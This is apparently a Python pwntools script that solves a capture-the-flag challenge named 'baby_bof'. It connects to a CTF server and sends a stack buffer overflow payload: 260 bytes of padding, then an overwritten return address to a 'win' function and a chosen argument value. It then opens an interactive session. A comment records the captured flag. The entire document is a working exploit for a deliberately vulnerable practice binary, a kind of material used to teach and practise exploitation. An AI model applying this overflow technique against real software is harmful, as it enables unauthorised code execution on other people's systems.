from pwn import *

p = remote('tasks.open.kksctf.ru',10002)
#p = process('./baby_bof')


#gdb.attach(p)

win_addr = 0x080485F6

p.recvuntil('name:')
p.sendline('a'*260 + p32(win_addr) +'b'*4 + p32(0xCAFEBABE))


p.interactive()

#kks{0v3rf10w_15_my_1!f3}
